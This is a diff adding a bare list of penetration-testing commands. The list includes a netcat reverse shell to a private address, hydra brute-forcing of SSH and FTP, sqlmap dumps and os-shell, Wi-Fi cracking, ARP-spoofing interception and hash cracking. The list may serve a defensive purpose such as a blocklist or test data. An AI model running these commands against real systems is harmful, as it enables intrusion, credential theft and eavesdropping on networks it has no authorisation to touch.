@@ -1,0 +1,37 @@
+nmap -A -T4 localhost
+nikto -h example.com
+hydra -l myAdmin -P /download/password.txt localhost
+sqlmap -u example.com --dbs
+nc -nvlp 12345
+netcat -e /bin/sh 192.168.1.100 4444
+john --wordlist=wordlist.txt hashes.txt
+wireshark
+aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap
+metasploit
+gobuster dir -u http://example.com -w wordlist.txt
+burp-suite
+sqlninja -m
+reaver -i wlan0 -b 00:11:22:33:44:55 -vv
+owasp-zap
+nikto -update
+nmap -sV -p- 192.168.1.100
+arp-scan -l
+ettercap -T -q -M arp //192.168.1.1/ //192.168.1.100/
+sniffjoke -dev eth0
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+hydra -L userlist.txt -P passlist.txt ssh://192.168.1.100
+nmap -sU -p 53 192.168.1.100
+sqlmap -u http://example.com/login.php --data "username=admin&password=123" --dump
+dnsenum example.com
+snort -q -A full -c /etc/snort/snort.conf
+mitmproxy
+tcpdump -i eth0 -w capture.pcap
+nbtscan 192.168.1.0/24
+nbtstat -A 192.168.1.100
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
+sqlmap -u http://example.com --os-shell
+metasploit auxiliary/scanner/smb/smb_version
+wpscan --url http://example.com --enumerate u
+enum4linux -a 192.168.1.100
+dirb http://example.com
+
